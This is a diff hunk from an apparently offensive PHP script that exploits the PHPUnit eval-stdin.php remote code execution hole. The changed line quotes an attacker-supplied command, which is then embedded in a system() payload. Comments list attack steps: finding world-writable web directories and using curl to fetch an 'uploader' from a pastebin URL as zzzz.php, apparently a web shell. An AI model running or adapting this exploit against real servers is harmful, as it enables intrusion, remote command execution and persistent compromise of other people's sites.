@@ -12,7 +12,7 @@ error_reporting(1);
 
 $path = $argv[1] . "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php";
 
-$command = $argv[2];
+$command = "'" . $argv[2] . "'";
 //find writable directory : find /var/www/html/ -type d -perm -o+w
 //get uploader : curl -s https://pastebin.com/raw/f4xQX4sL -o zzzz.php
 $data = "<?php system('$command');?>" ;
